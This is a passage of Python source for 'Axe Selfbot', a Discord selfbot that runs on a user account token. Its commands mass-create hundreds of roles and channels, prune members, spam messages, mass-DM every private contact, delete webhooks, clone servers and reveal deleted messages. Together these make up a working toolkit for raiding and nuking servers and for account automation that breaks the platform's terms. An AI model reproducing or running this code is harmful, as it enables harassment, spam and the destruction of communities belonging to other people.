        cfil = open("TheAxes/channels.txt","a")
        cfil.write(str(channel.id) + "\n")
      except Exception as e:
        await ctx.send("Failed Scraping Channels!")
  for role in rle:
      try:
        rfil = open("TheAxes/roles.txt","a")
        rfil.write(str(role.id) + "\n")
      except Exception as e:
        await ctx.send("Failed Scraping Roles!")

@axeop.command()
async def ping(ctx):
    await ctx.message.delete()
    await ctx.send(f'> AXE SELFBOT | PING\nLatency Is {round(axeop.latency * 1000)}ms')





@axeop.command(aliases=["mr"])
async def massrole(ctx, *, name):
    for _i in range(250):
        try:
            await ctx.guild.create_role(name=name, color=RandomColor)
        except:
            return

@axeop.command()
async def masschannel(ctx, *, name):
    for _i in range(200):
        try:
            await ctx.guild.create_text_channel(name=name)
        except:
            return

@axeop.command()
async def purge(ctx, amount: int):
    async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == axeop.user).map(lambda m: m):
        try:
           await message.delete()
        except:
            pass


@axeop.command()
async def delstickers(ctx):
    for emoji in list(ctx.list.stickers):
        try:
            await emoji.stickers()
        except:
            await ctx.reply("Failed!  Most likely missing perms")



@axeop.command()
async def delwebhook(ctx,link=None):
    if link == None:
      await ctx.send("> AXE SELFBOT | PLEASE SPECIFY A WEBHOOK")

    else:
        await ctx.send("> AXE SELFBOT | DELETEING WEBHOOK")

        result = requests.delete(link)

        if result.status_code == 204:
            await ctx.send("> AXE SELFBOT | WEBHOOK DELETED")
        else:
            await ctx.send("Failed! to delete")

@axeop.command(aliases=["Screenshot"])
async def ss(ctx, *, link=None):
        if link == None:
                await ctx.send("> AXE SELFBOT | PLEASE SPECIFY A WEBSITE LINK")
        else:
                        await ctx.send(f"https://image.thum.io/get/https://{link}")

@axeop.command(aliases=["userbanner"])
async def banner(ctx, user:discord.Member):
    if user == None:
        user = ctx.author
    req = await axeop.http.request(discord.http.Route("GET", "/users/{uid}", uid=user.id))
    banner_id = req["banner"]
    # If statement because the user may not have a banner
    if banner_id:
        banner_url = f"https://cdn.discordapp.com/banners/{user.id}/{banner_id}?size=1024"
    await ctx.send(f"{banner_url}")



@axeop.command(aliases=["dmall"])
async def massdm(ctx, *, messagetosend):
        await ctx.message.delete()
        await ctx.send("MASS DM STARTED\n> Made By TheAxes", mention_author=True, delete_after=5)
        for channel in axeop.private_channels:
                try:
                        await channel.send(messagetosend)
                except:
                        continue



@axeop.command()
async def massreact(ctx, emote):
    await ctx.message.delete()
    messages = await ctx.message.channel.history(limit=20).flatten()
    for message in messages:
        await message.add_reaction(emote)








@axeop.command()
async def snipe(ctx):
        try:
                channel = ctx.channel
                await ctx.send(f"> AXE SELFBOT | SNIPE\n Last Deleted Message In <#{channel.id}>\n Sent By {snipe_message_author[channel.id]}\n__Content__ : {snipe_message_content[channel.id]}\n__Deleted At__ : {snipetime[channel.id].strftime('%a, %d %B %Y, %I:%M %p UTC')} ")
        except KeyError:
                await ctx.send(f"> AXE SELFBOT | SNIPE \n There Is No Message To Snipe")





@axeop.command(aliases=["changehypesquad"])
async def hypesquad(ctx, house):
    await ctx.message.delete()
    request = requests.Session()
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
    }
    if house == "bravery":
        payload = {'house_id': 1}
    elif house == "brilliance":
        payload = {'house_id': 2}
    elif house == "balance":
        payload = {'house_id': 3}
    elif house == "random":
        houses = [1, 2, 3]
        payload = {'house_id': random.choice(houses)}
    try:
        request.post('https://discordapp.com/api/v6/hypesquad/online', headers=headers, json=payload, timeout=10)
    except Exception as e:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)



@axeop.command(name='disableCommunityMode', aliases=['dCM', 'dCommunityMode'])
async def disableCommunityMode(ctx):
        r = requests.patch(f'https://discord.com/api/v8/guilds/{ctx.guild.id}', headers=headers, json=
            {'description': None, 'features': {'0': 'NEWS'},
            'preferred_locale': 'en-US',
            'public_updates_channel_id': None, 'rules_channel_id': None})
@axeop.command(aliases=["eCM"])
async def enableCommunityMode(ctx):
        r = requests.patch(f'https://discord.com/api/v8/guilds/{ctx.guild.id}', headers=headers, json={"features":["COMMUNITY"],"verification_level":1,"default_message_notifications":0,"explicit_content_filter":2,"rules_channel_id":"1","public_updates_channel_id":"1"})


@axeop.command()
async def leavegroups(ctx):
    for channel in axeop.private_channels:
        if isinstance(channel, discord.GroupChannel):
            await channel.leave()
            await ctx.send("> Left Groups")


@axeop.command()
async def hastebin(ctx, *, message):
    await ctx.message.delete()
    r = requests.post("https://hastebin.com/documents", data=message).json()
    await ctx.send(f"<https://hastebin.com/{r['key']}>")



@axeop.command(aliases=["ascii"])
async def asciibanner(ctx, *, asciiword):
        await ctx.message.delete()
        ascii_banner = pyfiglet.figlet_format(asciiword)
        await ctx.send(f"```\n{ascii_banner}\n```")


@axeop.command(aliases=["logout"])
async def shutdown(ctx):
    await ctx.reply("> **Logging out of Axe Selfbot**")
    await ctx.reply("> **Logged out succesfully || Axe Selfbot**")
    await axeop.logout()



@axeop.command()
async def prune(ctx):
  await ctx.guild.prune_members(days=1, compute_prune_count=False, roles=ctx.guild.roles)
  await ctx.reply("> **Axe Selfbot**\n> **Axe Pruned Members**")



@axeop.command(aliases=["av"])
async def avatar(ctx, *, user: discord.Member = None):
    author = ctx.author

    if not user:
        user = author

    if user.is_avatar_animated():
        url = user.avatar_url_as(format="gif")
    if not user.is_avatar_animated():
        url = user.avatar_url_as(static_format="png")

    await ctx.send("> **AXE SELFBOT**   \n**{}'s avatar**: {}".format(user.name, url))


@axeop.command(aliases=['ghostping'])
async def ghostmsg(ctx):
        await ctx.message.delete()


@axeop.command()
async def spam(ctx , amount:int , * , message):
    for i in range(amount):
        await ctx.send(message)

@axeop.command()
async def servername (ctx ,*, name):
    await ctx.guild.edit(name=name, reason=remson)

@axeop.command(aliases=["copyguild", "CLONESERVER"])
async def copyserver(ctx):  # b'\xfc'
    await ctx.message.delete()
    await axeop.create_guild(f'COPY OF {ctx.guild.name}')
    await asyncio.sleep(4)
    for g in axeop.guilds:
        if f'COPY OF {ctx.guild.name}' in g.name:
            for c in g.channels:
                await c.delete()
            for cate in ctx.guild.categories:
                x = await g.create_category(f"{cate.name}")
                for chann in cate.channels:
                    if isinstance(chann, discord.VoiceChannel):
                        await x.create_voice_channel(f"{chann}")
                    if isinstance(chann, discord.TextChannel):
                        await x.create_text_channel(f"{chann}")
    try:
        await g.edit(icon=ctx.guild.icon_url)
    except:
        pass





axeop.run(token, bot=False)
